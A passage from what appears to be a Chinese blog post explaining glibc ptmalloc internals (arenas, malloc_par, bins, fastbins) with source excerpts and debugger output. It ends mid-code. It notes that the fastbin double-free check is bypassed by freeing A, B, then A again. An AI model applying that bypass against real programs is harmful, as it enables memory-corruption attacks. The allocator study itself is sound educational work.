<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    __libc_lock_define(, mutex);</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> flags;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> have_fastchunks;</span><br><span class="line"> </span><br><span class="line">    mfastbinptr fastbinsY[NFASTBINS];			<span class="comment">//fastbins</span></span><br><span class="line"></span><br><span class="line">    mchunkptr top;								<span class="comment">//topchunk</span></span><br><span class="line"></span><br><span class="line">    mchunkptr last_remainder;					<span class="comment">//最近一次分配剩下的堆块指针</span></span><br><span class="line"></span><br><span class="line">    mchunkptr bins[NBINS * <span class="number">2</span> - <span class="number">2</span>];				<span class="comment">//unsortedbin &amp; smallbins &amp; largebins</span></span><br><span class="line"></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> binmap[BINMAPSIZE];			</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span> *<span class="title">next</span>;</span>					<span class="comment">//下一个malloc_state</span></span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span> *<span class="title">next_free</span>;</span></span><br><span class="line"></span><br><span class="line">    INTERNAL_SIZE_T attached_threads;</span><br><span class="line"></span><br><span class="line">    INTERNAL_SIZE_T system_mem;</span><br><span class="line">    INTERNAL_SIZE_T max_system_mem;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">bins[0]</span><br><span class="line">bins[1] =&gt; unsorted bin</span><br><span class="line">bins[2:63] =&gt; small bins</span><br><span class="line">bins[64:126] =&gt; large bins</span><br></pre></td></tr></table></figure>

<p>其中<code>fastbins</code>是<code>bins</code>的缓存,类似于<code>tcache</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span> <span class="title">main_arena</span> =</span></span><br><span class="line">&#123;</span><br><span class="line">  .mutex = _LIBC_LOCK_INITIALIZER,</span><br><span class="line">  .next = &amp;main_arena,</span><br><span class="line">  .attached_threads = <span class="number">1</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>主分配区(<code>main_arena</code>)是<code>malloc_state</code>的一个实例,是一个<code>glibc</code>的<code>static</code>对象</p>
<p>默认情况下进程只有一个线程,也就不会有并发的动态分配请求,那么只需要有一个分配区,也就是<code>main_arena</code></p>
<p>在<code>glibc</code>加载进入内存之后,<code>main_arena</code>被创建,并且初步粗略地初始化一下,</p>
<p>对各个<code>bins</code>的初始化需要等<code>malloc_init_state</code>被调用,该函数会在首次动态分配前调用</p>
<p>如果有多条线程</p>
<p>那么就可能有多个分配区,各个分配区通过<code>next</code>指针组成环状单链表,</p>
<p>在应对并发的动态分配请求时,会沿着<code>next</code>指针找到一个空闲的分配区满足需求</p>
<p><strong>主分配区初始化发生时机</strong></p>
<p><code>init</code>采取懒加载机制,只会在第一次使用到动态分配函数如<code>malloc</code>或者<code>calloc</code>等时才会被调用</p>
<p><code>printf</code>等一些<code>I/O</code>函数也会调用到<code>malloc</code>申请缓冲区,导致<code>init</code>发生</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> *</span><br><span class="line">__libc_malloc (<span class="type">size_t</span> bytes)</span><br><span class="line">&#123;</span><br><span class="line">  mstate ar_ptr;</span><br><span class="line">  <span class="type">void</span> *victim;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!__malloc_initialized)			<span class="comment">//初始化整个ptmalloc堆管理器</span></span><br><span class="line">    ptmalloc_init ();</span><br><span class="line">    ...</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line"><span class="title function_">ptmalloc_init</span> <span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (__malloc_initialized)				<span class="comment">//避免重装</span></span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">  __malloc_initialized = <span class="literal">true</span>;			<span class="comment">//标记已经初始化</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> USE_TCACHE</span></span><br><span class="line">  tcache_key_initialize ();				<span class="comment">//此处初始化tcache key, 该key用来缓解double free</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">	...</span><br><span class="line"></span><br><span class="line">  thread_arena = &amp;main_arena;			<span class="comment">//主分配区(main_arena)是一个static模块变量</span></span><br><span class="line">	</span><br><span class="line">  malloc_init_state (&amp;main_arena);		<span class="comment">//对主分配区进行初始化</span></span><br></pre></td></tr></table></figure>





<p><strong>主分配区初始化内容</strong></p>
<p>1.<code>bins</code> 的每个头初始化指向自己,表示桶子里没有空闲堆块</p>
<p>2.<code>[主公技][锁定技] </code>对<code>main_arena</code>设置<code>fastbins</code>最大堆块大小不超过<code>0x80</code> (包含元数据)</p>
<p>3.初始化<code>topchunk</code>桶子头指向<code>unsortedbin</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line"><span class="title function_">malloc_init_state</span><span class="params">(mstate av)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    mbinptr bin;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Establish circular links for normal bins */</span></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">1</span>; i &lt; NBINS; ++i) <span class="comment">// NBINS = 128</span></span><br><span class="line">    &#123;</span><br><span class="line">        bin = bin_at(av, i);</span><br><span class="line">        bin-&gt;fd = bin-&gt;bk = bin; <span class="comment">// 最初时,各个bins链表头都指向自身</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> MORECORE_CONTIGUOUS</span></span><br><span class="line">    <span class="keyword">if</span> (av != &amp;main_arena)		</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">        set_noncontiguous(av);		<span class="comment">//看不懂</span></span><br><span class="line">    <span class="keyword">if</span> (av == &amp;main_arena)		<span class="comment">//主分配区的fastbins最大存放0x80的堆块(包含元数据)</span></span><br><span class="line">        set_max_fast(DEFAULT_MXFAST); <span class="comment">// 0x80</span></span><br><span class="line">    atomic_store_relaxed(&amp;av-&gt;have_fastchunks, <span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line">    av-&gt;top = initial_top(av);			<span class="comment">//初始化分配区头块,指向unsortedbin桶子头</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里对<code>topchunk</code>的初始化效果是,<code>topchunk</code>指向<code>unsortedbin</code>桶子头</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">top = 0x7ffff7fa6ce0 &lt;main_arena+96&gt;,</span><br><span class="line">bins = &#123;0x7ffff7fa6ce0 &lt;main_arena+96&gt;, 0x7ffff7fa6ce0 &lt;main_arena+96&gt;,...</span><br></pre></td></tr></table></figure>





<h3 id="malloc-par"><a href="#malloc-par" class="headerlink" title="malloc_par"></a>malloc_par</h3><p>分配区配置文件,只有一个实例<code>mp_</code>,位于<code>glibc</code>内部,在<code>glibc</code>加载时即完成初始化</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">malloc_par</span> <span class="title">mp_</span> =</span></span><br><span class="line">    &#123;</span><br><span class="line">        .top_pad = DEFAULT_TOP_PAD,</span><br><span class="line">        .n_mmaps_max = DEFAULT_MMAP_MAX,</span><br><span class="line">        .mmap_threshold = DEFAULT_MMAP_THRESHOLD,</span><br><span class="line">        .trim_threshold = DEFAULT_TRIM_THRESHOLD,</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> NARENAS_FROM_NCORES(n) ((n) * (sizeof(long) == 4 ? 2 : 8))</span></span><br><span class="line">        .arena_test = NARENAS_FROM_NCORES(<span class="number">1</span>)</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> USE_TCACHE</span></span><br><span class="line">            ,</span><br><span class="line">        .tcache_count = TCACHE_FILL_COUNT,</span><br><span class="line">        .tcache_bins = TCACHE_MAX_BINS,</span><br><span class="line">        .tcache_max_bytes = tidx2usize(TCACHE_MAX_BINS - <span class="number">1</span>),</span><br><span class="line">        .tcache_unsorted_limit = <span class="number">0</span> <span class="comment">/* No limit.  */</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>



<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p/x mp_</span><br><span class="line"><span class="variable">$15</span> = &#123;</span><br><span class="line">  trim_threshold = 0x20000,</span><br><span class="line">  top_pad = 0x20000,</span><br><span class="line">  mmap_threshold = 0x20000,</span><br><span class="line">  arena_test = 0x8,</span><br><span class="line">  arena_max = 0x0,</span><br><span class="line">  thp_pagesize = 0x0,</span><br><span class="line">  hp_pagesize = 0x0,</span><br><span class="line">  hp_flags = 0x0,</span><br><span class="line">  n_mmaps = 0x0,</span><br><span class="line">  n_mmaps_max = 0x10000,</span><br><span class="line">  max_n_mmaps = 0x0,</span><br><span class="line">  no_dyn_threshold = 0x0,</span><br><span class="line">  mmapped_mem = 0x0,</span><br><span class="line">  max_mmapped_mem = 0x0,</span><br><span class="line">  sbrk_base = 0x0,</span><br><span class="line">  tcache_bins = 0x40,				//tcache有0x40个桶子</span><br><span class="line">  tcache_max_bytes = 0x408,			//tcache中最大能放的堆块大小</span><br><span class="line">  tcache_count = 0x7,				//一个tcache桶子中最多放7块</span><br><span class="line">  tcache_unsorted_limit = 0x0</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>





<h2 id="斌s"><a href="#斌s" class="headerlink" title="斌s"></a>斌s</h2><p><strong>unsortedbin,smallbins,largebins</strong>实际上位于同一个数组的不同下标位置</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mchunkptr bins[NBINS * <span class="number">2</span> - <span class="number">2</span>];				<span class="comment">//unsortedbin &amp; smallbins &amp; largebins</span></span><br><span class="line">								<span class="comment">//NBINS = 128</span></span><br><span class="line">								<span class="comment">//bins[254]</span></span><br></pre></td></tr></table></figure>

<p><code>bins</code>共有<code>254</code>个元素,但是实际上是<code>127</code>个桶子头,每个桶子头占用相邻的两个<code>bins</code>元素</p>
<p>这个桶子头挺奇葩的,名义上桶子头是一个<code>malloc_chunk</code>,然而实际上一个桶子头只有<code>fd</code>和<code>bk</code>两个指针有效,其他部分和前一个桶子头重叠</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span> *<span class="title">mbinptr</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* addressing -- note that bin_at(0) does not exist */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> bin_at(m, i) \</span></span><br><span class="line"><span class="meta">  (mbinptr) (((char *) &amp;((m)-&gt;bins[((i) - 1) * 2]))			      \</span></span><br><span class="line"><span class="meta">             - offsetof (struct malloc_chunk, fd))</span></span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20241026183930533.png" alt="bin_at"></p>
<p>可以看到<code>bins[0]</code>既处于<code>bin_at(M,1)-&gt;fd</code>的位置,又处于<code>bin_at(M,2)-&gt;prev_size</code>的位置</p>
<p>而实际上桶子头并不需要<code>prev_size</code>和<code>size</code>这两个属性,只需要前驱后继指针就可以了</p>
<p><strong>因此<code>bins[0]</code>扮演<code>bin_at(M,1)-&gt;fd</code>的角色</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">bin_at(M,0)								//无效</span><br><span class="line">bin_at(M,1) =&gt; unsorted bin				//1个</span><br><span class="line">bin_at(M,2~63) =&gt; small bins			//</span><br><span class="line">bin_at(M,64~126) =&gt; large bins</span><br></pre></td></tr></table></figure>



<p><strong>fastbins</strong>比较特殊,是上述三种<code>bins</code>的缓存器,自己使用一个数组</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mfastbinptr fastbinsY[NFASTBINS];</span><br></pre></td></tr></table></figure>





<h3 id="Topchunk"><a href="#Topchunk" class="headerlink" title="Topchunk"></a>Topchunk</h3><p><code>topchunk</code>是杂货市场</p>
<p>最初斌家一穷二白, 用户从<strong>头块杂货市场</strong>直接拿货, 用完了释放的时候, 斌家的乱斌来拾破烂儿, 然后拿回家和大斌小斌分赃</p>
<p>此后用户优先从斌家拿货, 斌家没货才会去<strong>头块杂货市场</strong>拿货</p>
<h4 id="algorithm"><a href="#algorithm" class="headerlink" title="algorithm"></a>algorithm</h4><p>如果各个<code>bin</code>都没能满足分配请求,那么只能请<code>topchunk</code>出山</p>
<p>这是<code>ptmalloc</code>堆管理器能够拿出的最大内存块了</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20241031150833167.png" alt="image-20241031150833167"></p>
<h3 id="快斌Fastbins"><a href="#快斌Fastbins" class="headerlink" title="快斌Fastbins"></a>快斌Fastbins</h3><h4 id="datastructure"><a href="#datastructure" class="headerlink" title="datastructure"></a>datastructure</h4><p><code>fastbins</code>实际上是一组单链表, 该单链表的所有附加头节点位于列表<code>fastbins</code>列表中</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20241026103730227.png" alt="image-20241026103730227"></p>
<p><code>fastbins</code>中共有<code>10</code>个单链表</p>
<p>显然每个单链表中存放大小相同的堆块,具体来说,堆块大小到下标的映射为:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">fastbin_index(sz) </span><br><span class="line">	= ((((<span class="type">unsigned</span> <span class="type">int</span>) (sz)) &gt;&gt; (SIZE_SZ == <span class="number">8</span> ? <span class="number">4</span> : <span class="number">3</span>)) - <span class="number">2</span>)</span><br><span class="line">	= ( sz &gt;&gt; <span class="number">4</span> ) - <span class="number">2</span> </span><br><span class="line">        </span><br><span class="line"> </span><br><span class="line">#MAX_FAST_SIZE     </span><br><span class="line">	= (<span class="number">80</span> * SIZE_SZ / <span class="number">4</span>)</span><br><span class="line">    = <span class="number">160</span></span><br><span class="line"></span><br><span class="line">NFASTBINS  </span><br><span class="line">    = (fastbin_index (request2size (MAX_FAST_SIZE)) + <span class="number">1</span>)</span><br><span class="line">    = fastbin_index(<span class="number">0xb0</span>) + <span class="number">1</span></span><br><span class="line">    = <span class="number">0xb0</span> / <span class="number">0x10</span> - <span class="number">2</span> + <span class="number">1</span></span><br><span class="line">    = <span class="number">0xb</span> - <span class="number">2</span> + <span class="number">1</span></span><br><span class="line">    = <span class="number">0xa</span></span><br></pre></td></tr></table></figure>



<table>
<thead>
<tr>
<th>fastbins idx</th>
<th>mem_size</th>
<th>chunk_size</th>
</tr>
</thead>
<tbody><tr>
<td>0</td>
<td>0x10</td>
<td>0x20</td>
</tr>
<tr>
<td>1</td>
<td>0x20</td>
<td>0x30</td>
</tr>
<tr>
<td>2</td>
<td>0x30</td>
<td>0x40</td>
</tr>
<tr>
<td>…</td>
<td></td>
<td></td>
</tr>
<tr>
<td>6</td>
<td></td>
<td>0x80</td>
</tr>
<tr>
<td>…</td>
<td></td>
<td></td>
</tr>
<tr>
<td>9</td>
<td>0xa0</td>
<td>0xb0</td>
</tr>
</tbody></table>
<blockquote>
<p>然而实际上只能用到前<code>7</code>个,也就是<code>[0:6]</code>这<code>7</code>个桶,这是分配区初始化时会限制最大<code>fastbins</code>堆块大小为<code>0x80</code>(包含元数据)</p>
<p>然后在<code>_int_free</code>函数中会检查当前堆块大小</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>)(size) &lt;= (<span class="type">unsigned</span> <span class="type">long</span>)(get_max_fast ())&#123;</span><br><span class="line">    <span class="comment">//尝试使用fastbin</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>如果当前堆块大小大于<code>0x80</code>则不会通过该检查,也就不会往<code>fastbins</code>中塞</p>
<p>如果调用<code>set_max_fast(s)</code>重新设置<code>global_max_fast</code>值,使其大于<code>MAX_FAST_SIZE</code>,也是不可以的</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> set_max_fast(s) \</span></span><br><span class="line"><span class="meta">  global_max_fast = (((size_t) (s) &lt;= MALLOC_ALIGN_MASK - SIZE_SZ)	\</span></span><br><span class="line"><span class="meta">                     ? MIN_CHUNK_SIZE / 2 : ((s + SIZE_SZ) &amp; ~MALLOC_ALIGN_MASK))</span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="title function_">INTERNAL_SIZE_T</span></span><br><span class="line"> <span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* Tell the GCC optimizers that global_max_fast is never larger</span></span><br><span class="line"><span class="comment">     than MAX_FAST_SIZE.  This avoids out-of-bounds array accesses in</span></span><br><span class="line"><span class="comment">     _int_malloc after constant propagation of the size parameter.</span></span><br><span class="line"><span class="comment">     (The code never executes because malloc preserves the</span></span><br><span class="line"><span class="comment">     global_max_fast invariant, but the optimizers may not recognize</span></span><br><span class="line"><span class="comment">     this.)  */</span></span><br><span class="line">  <span class="keyword">if</span> (global_max_fast &gt; MAX_FAST_SIZE)</span><br><span class="line">    __builtin_unreachable ();</span><br><span class="line">  <span class="keyword">return</span> global_max_fast;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>直接<code>__builtin_unreachable</code></p>
</blockquote>
<h4 id="algorithm-1"><a href="#algorithm-1" class="headerlink" title="algorithm"></a>algorithm</h4><p>快斌可能去这几个地方进货:</p>
<p>1.<code>free</code>时<code>tcache</code>未启用或者已经充满,并且堆块不是<code>mmap</code>堆块,并且大小在快斌管理范围内,并且快斌缺货, 那么快斌会留下这块</p>
<h5 id="free"><a href="#free" class="headerlink" title="free"></a>free</h5><p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20241021102154730.png" alt="free beyond tcache"></p>
<p>当对应堆块大小的<code>tcache</code>被填充满之后,如果还有相同大小的堆块释放,会先尝试放到<code>fastbins</code>中</p>
<p>在<code>x64</code>上,默认情况下,小于<code>0x80</code>(包含元数据)的堆块,才会被塞到<code>fastbins</code>中</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//_int_malloc.c</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> idx = fastbin_index(size);								<span class="comment">//size换算桶下标</span></span><br><span class="line">fb = &amp;fastbin(av, idx);												<span class="comment">//桶子头节点</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Atomically link P to its fastbin: P-&gt;FD = *FB; *FB = P;  */</span></span><br><span class="line">mchunkptr old = *fb, old2;											<span class="comment">//*fb是桶子头原来指向的第一个chunk</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (SINGLE_THREAD_P)			<span class="comment">//如果当前进程只有一个线程,那么显然只会使用到main_arena,不会有其他分配区</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">/* Check that the top of the bin is not the record we are going to</span></span><br><span class="line"><span class="comment">       add (i.e., double free).  */</span>									<span class="comment">//唐氏一样的DF判断</span></span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect(old == p, <span class="number">0</span>))								<span class="comment">//当前释放的p是否和上次释放是同一块</span></span><br><span class="line">        malloc_printerr(<span class="string">&quot;double free or corruption (fasttop)&quot;</span>);</span><br><span class="line">    p-&gt;fd = PROTECT_PTR(&amp;p-&gt;fd, old);								<span class="comment">//头插法上链,后继指针也使用SafeLinking</span></span><br><span class="line">    *fb = p;														<span class="comment">//桶子头到堆块的指针是裸的</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">/* Check that the top of the bin is not the record we are going to</span></span><br><span class="line"><span class="comment">           add (i.e., double free).  */</span></span><br><span class="line">        <span class="keyword">if</span> (__builtin_expect(old == p, <span class="number">0</span>))</span><br><span class="line">            malloc_printerr(<span class="string">&quot;double free or corruption (fasttop)&quot;</span>);</span><br><span class="line">        old2 = old;</span><br><span class="line">        p-&gt;fd = PROTECT_PTR(&amp;p-&gt;fd, old);</span><br><span class="line">    &#125; <span class="keyword">while</span> ((old = catomic_compare_and_exchange_val_rel(fb, p, old2)) != old2);</span><br></pre></td></tr></table></figure>

<blockquote>
<p>这里有一个非常唐氏的二次释放检查</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__builtin_expect(old == p, <span class="number">0</span>))								</span><br><span class="line">    malloc_printerr(<span class="string">&quot;double free or corruption (fasttop)&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>意思就是本次释放的堆块和桶子里最后一次释放的堆块不能是一个</p>
<p>那先<code>free(A)</code>然后<code>free(B)</code>然后<code>free(A)</code>,就饶过了</p>
</blockquote>
<p><strong>注意到返还给fastbins的堆块,不会消除下一堆块P(Prev in use)标志,这就导致堆块合并时不会牵扯到fastbins中的堆块</strong></p>
<h5 id="malloc"><a href="#malloc" class="headerlink" title="malloc"></a>malloc</h5><p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20241026174304710.png" alt="malloc beyond tcache"></p>
<p>一次<code>malloc</code>请求,可能发生两件事:</p>
<p>1.如果<code>fastbin</code>对应桶子中有空闲堆块,把<code>fastbin</code>中相应桶子中的<strong>头块</strong>返回</p>
<p>2.如果<code>tcache</code>对应桶子有空,再把<code>fastbin</code>中剩下的相应大小的堆块塞满<code>tcache</code>对应的桶子</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>)(nb) &lt;= (<span class="type">unsigned</span> <span class="type">long</span>)(get_max_fast()))</span><br><span class="line">&#123;</span><br><span class="line">    idx = fastbin_index(nb);                                            <span class="comment">//大小换算下标</span></span><br><span class="line">    mfastbinptr *fb = &amp;fastbin(av, idx);                                <span class="comment">//桶子头</span></span><br><span class="line">    mchunkptr pp;                                               </span><br><span class="line">    victim = *fb;                                                       <span class="comment">//桶里的第一块</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (victim != <span class="literal">NULL</span>)                                                 <span class="comment">//如果桶里一块都没有,就别在fastbins中废话了,滚蛋就完了</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (__glibc_unlikely(misaligned_chunk(victim)))                 <span class="comment">//对齐检查</span></span><br><span class="line">            malloc_printerr(<span class="string">&quot;malloc(): unaligned fastbin chunk detected 2&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (SINGLE_THREAD_P)                                            <span class="comment">//如果是单线程则将头块拆下来, 次块成为头块</span></span><br><span class="line">            *fb = REVEAL_PTR(victim-&gt;fd);</span><br><span class="line">        <span class="keyword">else</span>                                                            <span class="comment">//如果是多线程, 则调用REMOVE_FB宏将头块拆下来</span></span><br><span class="line">            REMOVE_FB(fb, pp, victim);</span><br><span class="line">        <span class="keyword">if</span> (__glibc_likely(victim != <span class="literal">NULL</span>))                             <span class="comment">//正常情况下应该就拿到了一块</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="type">size_t</span> victim_idx = fastbin_index(chunksize(victim));       <span class="comment">//再检查一下拿到的这块大小是否合格</span></span><br><span class="line">            <span class="keyword">if</span> (__builtin_expect(victim_idx != idx, <span class="number">0</span>))					<span 